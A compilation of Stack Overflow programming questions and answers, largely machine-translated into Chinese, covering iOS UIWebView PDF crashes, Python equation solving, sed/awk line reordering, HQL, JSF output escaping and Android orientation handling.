我有一个视图控制器，显示为 presentModalViewController，里面有一个 uitoolbar 和一个 uiwebview。在 web 视图中显示一个 pdf 文件。Web 视图默认允许我选择文本并向我显示标准 UIMenuController 的复制功能。此时，如果我关闭视图控制器，则应用程序崩溃并在控制台中显示此记录的错误：

```
libobjc.A.dylib`objc_msgSend:
0x372daf68:  teq.w  r0, #0
0x372daf6c:  beq    0x372dafaa               ; objc_msgSend + 66
0x372daf6e:  push.w {r3, r4}
0x372daf72:  ldr    r4, [r0]
0x372daf74:  lsr.w  r9, r1, #2
0x372daf78:  ldr    r3, [r4, #8]
0x372daf7a:  add.w  r3, r3, #8
0x372daf7e:  ldr    r12, [r3, #-8]
0x372daf82:  and.w  r9, r9, r12
0x372daf86:  ldr.w  r4, [r3, r9, lsl #2]
0x372daf8a:  teq.w  r4, #0
0x372daf8e:  add.w  r9, r9, #1
0x372daf92:  beq    0x372dafa6               ; objc_msgSend + 62
0x372daf94:  ldr.w  r12, [r4]
0x372daf98:  teq.w  r1, r12
0x372daf9c:  bne    0x372db17e               ; objc_msgSendSuper_stret + 34
0x372daf9e:  ldr.w  r12, [r4, #8]
0x372dafa2:  pop    {r3, r4}
0x372dafa4:  bx     r12
0x372dafa6:  pop    {r3, r4}
0x372dafa8:  b      0x372dafb0               ; objc_msgSend_uncached
0x372dafaa:  mov.w  r1, #0
0x372dafae:  bx     lr 
```

我不明白这是否是我的 uiwebview 错误 oa 错误

我也尝试使用 CGPDFDocument 来呈现 pdf 页面，但我无法显示 UIMenuController 并选择文本并在文档内执行标准复制操作。我也尝试从这个出色的项目开始，但在这个项目中我也无法执行复制操作 - [https://github.com/vfr/Reader](https://github.com/vfr/Reader)

基本上这些是使用的代码。我正在使用带有 ARC 的 iOS 5

```
- (void)viewDidLoad
{
[super viewDidLoad];

if (![urlPdfFile hasPrefix:@"http"]) {

NSString *ofType = [urlPdfFile pathExtension];
NSString *pathForResource = [[[urlPdfFile lastPathComponent] componentsSeparatedByString:@"."] objectAtIndex:0];
NSString *inDirectory = [urlPdfFile stringByDeletingLastPathComponent];

NSString *url = [[NSBundle mainBundle] pathForResource:pathForResource 
                                                ofType:ofType 
                                           inDirectory:inDirectory];

[self loadCatalogueFile:url];
} else {
[self loadFile:urlPdfFile];
}

}

- (void)viewDidUnload
{
[self setMyWebView:nil];
[super viewDidUnload];
}

-(void)viewDidDisappear:(BOOL)animated {    
[super viewDidDisappear:animated];
[self.view removeFromSuperview];
self.view=nil;
[self viewDidUnload];
}

-(void)loadCatalogueFile:(NSString*)url {

 NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL fileURLWithPath:url]];
[myWebView loadRequest:request];
}

-(void)loadFile:(NSString*)url
{
NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:url]];
[myWebView loadRequest:request];
}

-(void) webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error
{
//
}

-(void)webViewDidFinishLoad:(UIWebView *)webView
{
//
}

- (void)webViewDidStartLoad:(UIWebView *)webView {
//
} 
```

非常感谢您的帮助！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T10:46:29.290

有同样的问题。

我的原因是我保留了包含 UIWebView 的视图控制器，并重新使用了它。要修复它，只需每次从头开始创建视图控制器。

# c# - Serendipity with multiplicity? Composite Primary Key of 2 Foreign Keys in EF throws error

> ID：10499937
> 
> 赞同：0
> 
> 时间：2012-05-08T13:49:05.447
> 
> 标签：c#, entity-framework, entity-framework-4

I am using Entity Framework 4.0 with Database First and come across the following problem. I have the following tables (simplified for visual purposes)

Table B contains a Composite Primary Key of 2 Foreign Keys.

SQL Server Tables A,B,C

```
A            B                 C
A_ID(PK)<----A_ID(PK)(FK)      C_ID(PK)
             C_ID(PK)(FK)------^ 
```

When I update my model,

I see the relationships in my model browser but for some reason Table B looks like:

```
A            B                 C
A_ID(PK)<----A_ID(PK)(FK)      C_ID(PK)
             C_ID(FK)----------^ 
```

and i get the following error:

Error 36 Error 113: Multiplicity is not valid in Role 'B' in relationship 'FK_B_A'. Because the Dependent Role refers to the key properties, the upper bound of the multiplicity of the Dependent Role must be 1\. C:......MyDatabase.edmx 3776 11 MyABCProject

This one is worth your morning cup of coffee becoming cold.

Thanks alot!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T13:36:32.147

Goto the model browser and add C_ID to your A_ID thus creating a Composite Primary key.

# python - 如何在 Python 中求解方程？

> ID：10499941
> 
> 赞同：36
> 
> 时间：2012-05-08T13:49:35.387
> 
> 标签：python, calculator, equation

假设我有一个等式：

`2x + 6 = 12`

用代数我们可以看到`x = 3`。如何用 Python 编写一个可以解决的程序`x`？我是编程新手，我看了看，`eval()`但`exec()`我不知道如何让他们做我想做的事。我不想使用外部库（例如 SAGE），我只想用普通的 Python 来做到这一点。

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-05-08T13:54:09.427

[SymPy](http://sympy.org/en/index.html)怎么样？他们的[求解器](http://docs.sympy.org/0.7.1/modules/solvers/solvers.html)看起来像你需要的。如果您想自己构建库，请查看他们的源代码......</p>

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-05-08T18:23:00.977

有两种方法可以解决这个问题：数字和符号。

要以数字方式解决它，您必须首先将其编码为“可运行”函数 - 插入一个值，取出一个值。例如，

```
def my_function(x):
    return 2*x + 6 
```

解析一个字符串来自动创建这样一个函数是很有可能的；假设您解析`2x + 6`为一个列表`[6, 2]`（其中列表索引对应于 x 的幂 - 所以 6*x^0 + 2*x^1）。然后：

```
def makePoly(arr):
    def fn(x):
        return sum(c*x**p for p,c in enumerate(arr))
    return fn

my_func = makePoly([6, 2])
my_func(3)    # returns 12 
```

然后，您需要另一个函数，它反复将 x 值插入您的函数，查看结果与想要找到的结果之间的差异，并调整其 x 值以（希望）最小化差异。

```
def dx(fn, x, delta=0.001):
    return (fn(x+delta) - fn(x))/delta

def solve(fn, value, x=0.5, maxtries=1000, maxerr=0.00001):
    for tries in xrange(maxtries):
        err = fn(x) - value
        if abs(err) < maxerr:
            return x
        slope = dx(fn, x)
        x -= err/slope
    raise ValueError('no solution found') 
```

这里有很多潜在的问题 - 找到一个好的起始 x 值，假设函数实际上有一个解（即 x^2 + 2 = 0 没有实值答案），达到计算精度的极限，等等。但是在这种情况下，误差最小化函数是合适的，我们得到了一个很好的结果：

```
solve(my_func, 16)    # returns (x =) 5.000000000000496 
```

请注意，此解决方案不是*绝对*正确的。如果你需要它是完美的，或者如果你想尝试解析方程族，你必须求助于一个更复杂的野兽：一个符号求解器。

符号求解器，如 Mathematica 或 Maple，是一个专家系统，具有许多关于代数、微积分等的内置规则（“知识”）；它“知道” sin 的导数是 cos，kx^p 的导数是 kpx^(p-1)，依此类推。当你给它一个方程时，它试图找到一条路径，一组规则应用，从它所在的位置（方程）到你想要的位置（方程的最简单可能形式，希望是解） .

您的示例方程式非常简单；一个象征性的解决方案可能如下所示：

```
=> LHS([6, 2]) RHS([16])

# rule: pull all coefficients into LHS
LHS, RHS = [lh-rh for lh,rh in izip_longest(LHS, RHS, 0)], [0]

=> LHS([-10,2]) RHS([0])

# rule: solve first-degree poly
if RHS==[0] and len(LHS)==2:
    LHS, RHS = [0,1], [-LHS[0]/LHS[1]]

=> LHS([0,1]) RHS([5]) 
```

并且有你的解决方案：x = 5。

我希望这能给这个想法带来味道；实施的细节（找到一套好的、完整的规则并决定何时应用每条规则）很容易耗费许多人-年的努力。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2012-05-08T14:01:14.290

Python 可能很好，但它不是上帝……

求解方程有几种不同的方法。如果您正在寻找分析解决方案，SymPy 已经被提及。

如果您很高兴只有一个数值解决方案，Numpy 有一些可以提供帮助的例程。如果您只对多项式的解决方案感兴趣，numpy.roots 将起作用。特别针对您提到的案例：

```
>>> import numpy
>>> numpy.roots([2,-6])
array([3.0]) 
```

对于更复杂的表达式，请查看 scipy.fsolve。

无论哪种方式，您都无法使用库逃脱。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-05-08T14:10:06.827

如果您只想解决正整数的**极其有限**的方程组，那么可以这样做：`mx + c = y``m, c, y`

```
import re
def solve_linear_equation ( equ ):
    """
    Given an input string of the format "3x+2=6", solves for x.
    The format must be as shown - no whitespace, no decimal numbers,
    no negative numbers.
    """
    match = re.match(r"(\d+)x\+(\d+)=(\d+)", equ)
    m, c, y = match.groups()
    m, c, y = float(m), float(c), float(y) # Convert from strings to numbers
    x = (y-c)/m
    print ("x = %f" % x) 
```

一些测试：

```
>>> solve_linear_equation("2x+4=12")
x = 4.000000
>>> solve_linear_equation("123x+456=789")
x = 2.707317
>>> 
```

如果您想识别和求解**任意**方程，例如`sin(x) + e^(i*pi*x) = 1`，那么您将需要实现某种符号数学引擎，类似于`maxima`、`Mathematica`、MATLAB`solve()`或 Symbolic Toolbox 等。作为新手，这超出了您的理解范围。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-05-08T13:57:05.620

使用不同的工具。像[Wolfram Alpha](http://wolframalpha.com/)、[Maple](http://www.maplesoft.com/)、[R](http://www.r-project.org/)、[Octave](http://www.gnu.org/software/octave/)、[Matlab](http://www.mathworks.de/products/matlab/)或任何其他代数软件包。

作为初学者，您可能不应该尝试解决这样一个不平凡的问题。

# qt - qt 设计器中禁用的拆分器

> ID：10499942
> 
> 赞同：22
> 
> 时间：2012-05-08T13:49:35.993
> 
> 标签：qt, qt-designer

我在 Windows 7 上使用 qt 4.8.0。当我打开 qt 设计器并在其中创建小部件时，我无法设置“在拆分器中垂直/水平布局”。布局小部件框中也没有拆分器。所有其他布局都运行良好。

有没有人遇到相同或类似的问题？

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-05-08T14:26:44.723

您需要选择两个或更多小部件，然后使用 layout -> vertical/horizo​​ntal splitter 选项。这将为设计人员提供足够的上下文来执行操作。

另请注意，选定的小部件不能已经成为布局的一部分。如果是，您需要先打破布局（`layout->Break Layout`在上下文菜单中）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:54:36.317

它位于右键单击小部件正文时出现的上下文菜单中。

您可以在那里建立小部件的布局，包括拆分器。

编辑：对不起，我在快速的初读中误解了。您是说它没有出现在其他布局选项之间的右键菜单中吗？

# facebook - 如何获取提及页面的fb帖子

> ID：10499945
> 
> 赞同：2
> 
> 时间：2012-05-08T13:49:40.650
> 
> 标签：facebook, api, facebook-graph-api, facebook-fql, facebook-page

我是 Facebook 页面的管理员，我正在尝试通过 API 或 FQL 获取发布在私人流墙上的内容，其中提到了我的页面。如果我尝试

`SELECT type,target_id, post_id, message, actor_id, tagged_ids FROM stream WHERE source_id=PAGEID`

我只会得到：我在页面墙上的帖子（或页面），用户在页面墙上的帖子，**但我看不到用户在他们自己的墙上标记页面的帖子。** **每个访问我的页面的用户都可以看到它们，因此它们应该可以*通过某些 API 访问 *...但我不明白如何。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:29:09.843

您*应该*能够通过查询`stream_tag`表来获取此信息，但在我的测试中，我无法让它返回任何数据。

如果帖子在您的页面上可见，您应该能够通过以下查询获得提及您的帖子：

```
SELECT type, target_id, post_id, message, actor_id, tagged_ids 
    FROM stream WHERE source_id =PAGEID AND actor_id !=PAGEID 
```

# awk - awk 帮助，使用组合查找文件，然后使用该组合计算该文件内的字段总和

> ID：10499946
> 
> 赞同：-1
> 
> 时间：2012-05-08T13:49:48.520
> 
> 标签：awk

我正在将一些数据假脱机到这样的文件中

```
acb.txt 1 aa 3
gfh.txt 1 aa 3
a3g.txt 2 aa 4
tfh.txt 2 aa 4 
```

问题是

1.  获取特定组合的文件名
2.  打开每个文件（我们使用 rds 工具）
3.  检查文件中的上述组合
4.  使用上述组合在该文件中求和 32 字段。
5.  存储总和和组合。

我可以使用 grep 并使用两个循环来实现它，一个在组合上，另一个在该组合中的文件数上，寻找更好的 awk 逻辑。我怀疑 grep 不会完全证明

添加了更多信息：

使用 awk，我如何将字符串存储到一个数组中

```
a[1 aa 3]=acb.txt gfh.txt
a[2 aa 4]=a3g.txt tfh.txt 
```

然后从外部获取该值以打开文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T15:52:33.153

```
awk '{a[$2, $3, $4] = a[$2, $3, $4] " " $1}' inputfile 
```

这将创建您的数组。但它没有做任何有用的事情。

否则，您的问题仍然太模糊。显示您的`grep`和两个循环，并更详细地描述*您实际尝试执行的操作。*

# zend-framework - 在 Zend Framework 的另一个模块中使用默认模块的操作助手

> ID：10499955
> 
> 赞同：0
> 
> 时间：2012-05-08T13:50:14.940
> 
> 标签：zend-framework, view-helpers

我想我已经尝试了我发现的一切来解决这个问题，包括 SO 上的所有答案。

在我的项目中有一个`admin`模块，然后是默认模块。现在我希望管理模块使用默认模块的助手。最好仅当没有同名的管理模块助手时。这可能吗？

我得到的错误信息是：

> 消息：在注册表中找不到名为“HeadBase”的插件；使用的路径： Admin_View_Helper_: /application/modules/admin/views\helpers/ Zend_View_Helper_: Zend/View/Helper/

我用的是采埃孚 1.11

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T08:51:35.097

找到了解决方案。在 中`Bootstrap`，为助手添加一个 init，如下所示：

```
protected function _initHelpers()
{
    $this->bootstrap('view');
    $view = $this->getResource('view');
    $view->addHelperPath(APPLICATION_PATH . '/views/helpers/', 'Zend_View_Helper');
} 
```

`APPLICATION_PATH . '/views/helpers/'`这会为类前缀为的助手添加助手路径`Zend_View_Helper`。

# regex - 如何使用正则表达式匹配（bash脚本）将文件中的指定行移动到其他地方？

> ID：10499960
> 
> 赞同：1
> 
> 时间：2012-05-08T13:50:40.800
> 
> 标签：regex, string, bash

好的，文件内容：

```
asdasd0
**asdasd1**
asdasd2
asdasd3
asdasd4
**asdasd5**
asdasd6 
```

我想在“^asdasd1”正则表达式匹配行之前移动“^asdasd5”正则表达式匹配行：

```
asdasd0
**asdasd5**
**asdasd1**
asdasd2
asdasd3
asdasd4
asdasd6 
```

如何？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T14:29:07.380

目前尚不清楚您的模式是什么——什么是不变的，什么是变化的。

```
sed "/.*5/d;/.*1/i"$(sed -n '/.*5/p' FILE)  FILE 
```

我删除了包含 5 的行，并将该行插入到包含 1 的行后面。

您不能在此处使用 -i ，因为该文件是他自己的参考。

```
sed "/.*5/d;/.*1/i"$(sed -n '/.*5/p' FILE)  FILE > FILE.tmp 
mv FILE.tmp FILE 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T15:37:40.687

这是一种使用方法`ex`：

```
ex inputfile <<'EOF'
/^asdasd5
d
/^asdasd1
-
put
wq
EOF 
```

同样的事情都在一条线上：

```
printf '%s\n' '/^asdasd5' 'd' '/^asdasd1' '-' 'put' 'wq' | ex inputfile 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T14:03:37.203

一种使用方式`perl`：

```
s/^(asdasd1.*)(^asdasd5(?:\n|$))/$2$1/sm 
```

一个例子。内容`script.pl`：

```
use warnings;
use strict;

my $data;

## Read all DATA content into $data variable.
do { 
    $/ = undef;
    $data = <DATA>;
};

## Last 's' flag lets '.*' match newlines.
## 'm' flag lets '^' and '$' match at the beginning or end of each line.
$data =~ s/^(asdasd1.*)(^asdasd5(?:\n|$))/$2$1/sm;

print $data;

__DATA__
asdasd0
asdasd1
asdasd2
asdasd3
asdasd4
asdasd5
asdasd6 
```

像这样运行它：

```
perl script.pl 
```

具有以下输出：

```
asdasd0
asdasd5
asdasd1
asdasd2
asdasd3
asdasd4
asdasd6 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-08T14:16:51.717

这可能对您有用：

```
sed '/asdasd1/,/asdasd5/{/asdasd5/{G;b};/asdasd1/{h;d};H;d}' file 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-08T15:04:02.867

由于这是面向行的，因此您实际上并不需要正则表达式。当您看到起始线时，开始捕获这些线。当您看到结束行时，打印它，打印捕获的行，然后打印文件的其余部分：

```
awk -v start=asdasd1 -v end=asdasd5 '
    match($0,start) {capture=1}
    match($0,end)   {print $0 captured; capture=0; next}
    capture         {captured = captured RS $0; next}
    1
' 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-03-13T17:43:55.390

最简单的方法是一个简单的 awk 双通算法：

```
awk '(NR==FNR) { if ($0 ~ /asdasd5/) t=$0; next }
     /asdasd5/ { next }
     /asdasd1/ { print t }
     1' file file 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-05-08T14:26:04.247

使用 sed 的命令 'i' 在模式之前插入。见[http://www.grymoire.com/Unix/Sed.html#uh-41](http://www.grymoire.com/Unix/Sed.html#uh-41)

# java - HQL 从方法中获取值

> ID：10499962
> 
> 赞同：1
> 
> 时间：2012-05-08T13:50:41.983
> 
> 标签：java, hibernate, jakarta-ee, hql

**我想在 HQL 中使用我的“where”子句中的抽象方法的结果。这可以做到吗？**

像这样的东西：

```
@NamedQuery(name="getMailRelations", query="Select mr from MailRelation mr where mr.getOccurrences() > 5" 
```

我有一个像这样的映射超类

```
@Entity
@Table(name="Mail_Entity", schema="relations")
@Inheritance(strategy=InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name="relationType", discriminatorType=DiscriminatorType.STRING)
@PersistenceContext(name="domas")
public abstract class MailRelation {

@Id
@GeneratedValue(strategy=GenerationType.IDENTITY)
private long id;

@ManyToOne(cascade = {CascadeType.MERGE, CascadeType.REFRESH, CascadeType.PERSIST})
@JoinColumn(name="mailId", referencedColumnName="mailId", nullable=false)
private Mail mail;

public void setMail(Mail mail) {
    this.mail = mail;
    if(!mail.getMailRelations().contains(this))
            mail.addMailRelation(this);
    }

public abstract int getOccurrences();

    public Mail getMail() {
        return mail;
   // and more code...... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T14:46:40.837

不，那是不可能的。HQL 代码被翻译成 SQL 并在数据库上执行。通常 Java 方法不能被翻译成 SQL，并且数据库没有任何访问你的 Java 代码的权限。

如果你有这样的问题，例如有这三种可能性来处理它。这些可能性都不是完美的。

1）您使用 WHERE、GROUP BY 和 HAVING 在 HQL（或 SQL）中编写方法的逻辑。在您的示例中，getOc​​currences() 方法似乎返回了许多行，这可能可以通过“HAVING COUNT(...) > 5”来处理。

2）您使用数据库存储过程。这些是 p。前任。用 PL/SQL 编写的过程（在 Oracle 的情况下）。它们可以在 select 语句中访问。但是您失去了所选数据库的独立性。

3) 您加载了比需要更多的行并稍后在 Java 代码中进行过滤。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T17:31:05.560

解决方案取决于您，但我添加了一些您可以考虑的其他选项：

如果您设法在所有情况下**预先计算**哈希，请使用参数化命名查询：

```
@NamedQuery(name="getMailRelations", query="Select mr from MailRelation mr where :occurrences > 5" 
```

然后，您可以调用查询并添加参数“occurrences”：

```
String precalculatedHash = //your code here.
entityManager.createNamedQuery("getMailRelations",MailRelation.class).setParameter("occurrences", precalculatedHash).getResultList(); 
```

另一种选择是更深入地了解您的哈希逻辑，并确定**您想用它实现什么**。考虑到这一点，您可以使用[Criteria API](http://docs.jboss.org/hibernate/orm/3.2/api/org/hibernate/Criteria.html)创建查询并添加该哈希表示的所有限制。这可能有点棘手，所以如果散列被证明过于依赖上下文（我的意思是如果它很大程度上依赖于你坚持的内容，以及你的应用程序的上下文），就放弃这个选项。

第三个选项是通过参数或[Criteria API](http://docs.jboss.org/hibernate/orm/3.2/api/org/hibernate/Criteria.html)**带来所有结果**（或可能的最小结果集），并制作您的特定过滤逻辑。

# java - 在 html 代码标签中设置文本样式

> ID：10499963
> 
> 赞同：0
> 
> 时间：2012-05-08T13:50:47.177
> 
> 标签：java, html, css, jsf

我想设计一些文本女巫被包裹在一个 html`<code>`标记中。但是样式是在服务器端类中完成的。例如：

```
myValue.replaceAll(" " + textToStyle + " ", " <span style=\"color: orange;\"> " + textToStyle + "</span> "); 
```

此行作为包含在`<code>`标签中的文本。文本显示在 JSF 数据表中：

```
<h:column>
    <code class="dt_row">
        #{myList.myValue}
    </code>
</h:column> 
```

`<code>`标签 css 类：

```
.dt_row {
    height: 8px;
    margin: 3px 3px 3px 3px;
    color: #000000;
    font-size: 12px;
} 
```

问题是当 html 在浏览器中呈现时，代码会与所有标签一起显示。我希望这不会`<span style=\"color: orange;\">`显示在页面中，而是显示为橙色的文本值。

任何想法如何实现这一目标？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:57:51.857

代替

```
#{myList.myValue} 
```

你可以试试

```
<h:outputText value="#{myList.myValue}" escape="false" /> 
```

将“escape”设置为false应该可以完成工作（否则框架将转义字符串......）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T14:07:16.487

更优雅的方法是使用 h:outputText 组件的样式属性并引用 bean 的颜色，例如：

```
<h:column>
    <code class="dt_row">
        <h:outputText value="#{myList.myValue}" style="color: #{myList.color};" />
    </code>
</h:column> 
```

# javascript - 如何在jquery中写这个？

> ID：10499965
> 
> 赞同：-1
> 
> 时间：2012-05-08T13:50:51.720
> 
> 标签：javascript, jquery, rewrite

我在使用 javascript 和 jQuery 时遇到了这个问题，想知道是否可以得到一些帮助来将此 javascript 重写为 jQuery？=)

```
 var url = location.href.split('#');
 var active = url[1];
 if(active == "home") { 
 /* code */
 }
 else if(active == "blog") { 
 /* code */
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:53:28.673

换成怎么样[`window.location.hash`](https://developer.mozilla.org/en/DOM/window.location)？

```
switch (window.location.hash.substr(1)){
  case 'home':
    // code
    break;
  case 'blog':
    // code
    break;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:52:32.200

正如你所拥有的那样。jQuery 不是 JavaScript 的替代品，它只是一个扩展。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:53:27.037

jQuery 主要是一个 DOM 操作和 Ajax 库。它没有加载用于摆弄 URI 甚至字符串的函数。我认为核心 jQuery 中没有任何东西可以改进问题中的代码。

# c# - 在 c# 中的 axacropdf 控件内导航 pdf 中的特定页面

> ID：10499985
> 
> 赞同：0
> 
> 时间：2012-05-08T13:52:11.720
> 
> 标签：c#, pdf, process, navigation, axacropdf

我卡在我的应用程序中。我正在开发一个 pdf 查看器应用程序。我用 .net 3.5 创建 Windows 应用程序。在这个应用程序中，我采用了 axacropdf 控件并将超链接 1 到 10 作为页码。现在，当我单击特定页码超链接时，我想在 axacropdf 控件中显示带有该页面的 pdf 文件。例如，我有 10 页的 pdf 文件。我有所有页面的列表，例如

```
导航到第 1 页
导航到第 2 页
导航到第 3 页
导航到第 4 页
导航到第 5 页
.................. ETC。

```

现在，当我单击超链接**导航到第 5 页**时，pdf 文件在 axacropdf 文件中打开第 5 页。这是代码：

```
    //创建打开pdf文件的进程
                进程 myprocess = new Process();
                myprocess.StartInfo.FileName = "AcroRd32.exe";
                myprocess.StartInfo.Arguments = "/A \"page=" + y + "\" " + txtFileName.Text + " ";
                myprocess.Start();

```

我已经对此进行了谷歌搜索，但我发现只能通过进程类在应用程序之外打开具有特定页面的 pdf 文件。但我想在 c# 的 adobe pdf reader (axacropdf) 控件中打开这个 pdf 文件。请给我建议或代码。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T14:00:14.763

我会使用这个[API 参考](http://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/iac_api_reference.pdf)

这将变得容易得多，他们甚至在第 113 页上有一个名为 SetCurrentPage 的方法，希望对您有所帮助。

# android - Android - 刷新 Facebook AccessToken

> ID：10499989
> 
> 赞同：1
> 
> 时间：2012-05-08T13:52:18.847
> 
> 标签：android, facebook, offline, access-token

本月 Facebook 删除了“offline_access”权限。如何扩展或请求新的访问令牌？

我应该像在 facebook.authorize 之前一样使用吗？但在这种情况下，用户想再次看到登录对话框吗？

# linq-to-sql - 简单的 LinqToSql POCO，AutoMapping 是唯一的选择吗？

> ID：10499995
> 
> 赞同：0
> 
> 时间：2012-05-08T13:52:53.823
> 
> 标签：linq-to-sql, automapper, poco

现在我正在决定一个`OR/M`我正在研究的解决方案。一方面，我处于 ​​EF 与 LinqToSql 和[**Dapper**](https://github.com/SamSaffron/dapper-dot-net)（两者）之间的十字路口。

SO 使用 L2SQL 和 Dapper（用于性能瓶颈）的事实吸引了我实施这个解决方案。最初吸引我到 EF 的是我可以实现 POCO 实体的简单性。

我用谷歌搜索了一段时间，但找不到我要找的东西。我想要一个干净简单的解决方案，将 LinqToSql 与 POCO 实体一起使用。也就是说，拥有与 POCO 实体的存储库合同，而不必手动将这些映射到 LinqToSql 实体。这可以通过使用[**AutoMapper**](https://github.com/AutoMapper/AutoMapper)轻松实现吗？

我认为这应该不是问题，从 POCO 映射到 L2SQL 然后再返回（返回值）到 POCO 的调用也不会超过一对。

有没有我可以研究的扩展方法，如果它从未实例化，它会创建一个默认映射器？

除了使用某种映射工具（例如您`CreateObjectSet<T>`在 EF 中所做的）之外，还有其他解决方案吗？

# android - 防止应用程序在方向更改期间重新启动

> ID：10499998
> 
> 赞同：3
> 
> 时间：2012-05-08T13:53:07.020
> 
> 标签：android

我有一个画布，当方向改变时它会重新绘制。这是一个自定义画布，不是 android 提供的。

当屏幕布局更改时，应用程序状态和（所有视图的状态）都会重置。我将屏幕方向更改为仅纵向；它保持屏幕布局不变，但应用程序再次重置。

我检查了文档，发现当方向改变发生时，活动被破坏并再次重新启动。Savestate() 无法保存和加载位图数据或我的自定义画布所需的任何大数据。

我再次检查了文档，发现处理运行时更改主题，其中提到了在发生特定配置更改时调用的 onConfigurationChanged()，在我的情况下是“方向”。此方法可防止重新启动，并将如何实现配置更改留给开发人员。它甚至在上一段中提到，如果我不实现该方法，那么这只会导致活动跳过 onRestart() 并且什么也不做。我将清单文件设置为

```
android:screenOrientation="portrait"
android:configChanges="orientation" 
```

而且我没有实现 onConfigurationChanged()。但这也无济于事。我不知道为什么。这对我来说似乎很有帮助。

如果您有任何解决方案，请发布。此外，应用程序需要一些合理的时间，我希望应用程序在方向改变时不要重新启动。实际上，当这种情况发生时，我不想做任何事情。我也在使用模拟器，所以请澄清它是否只是模拟器的问题。

PS 我的互联网连接中断，我正在使用我愚蠢的移动客户端。我检查了离线文档。请忍受我的拼写。我正在努力寻找解决方案，但目前我很困惑。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-08T13:56:16.757

在你的 AndroidMenifest.xml 中使用它

```
<activity
            android:name="MyActivity"
            android:configChanges="orientation|keyboard|keyboardHidden"
            android:screenOrientation="sensor" /> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-02-04T17:29:14.137

在清单中编写此代码：

```
android:configChanges="orientation|screenSize|keyboardHidden" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T14:12:11.427

对于 AndroidManifest 中的每个活动，可以指定 screenOrientation。例如，要指定活动始终保持纵向模式，可以将以下内容添加到活动元素中：

安卓：screenOrientation="人像"

同样，可以使用以下命令指定横向模式：

安卓：screenOrientation="风景"

但是，前面仍然会导致硬键盘滑出时activity被销毁并重新启动。因此，第三种方法是可能的：告诉Android系统应用程序应该处理方向和键盘滑出事件。这是通过将以下属性添加到活动元素：android:configChanges="orientation|keyboardHidden"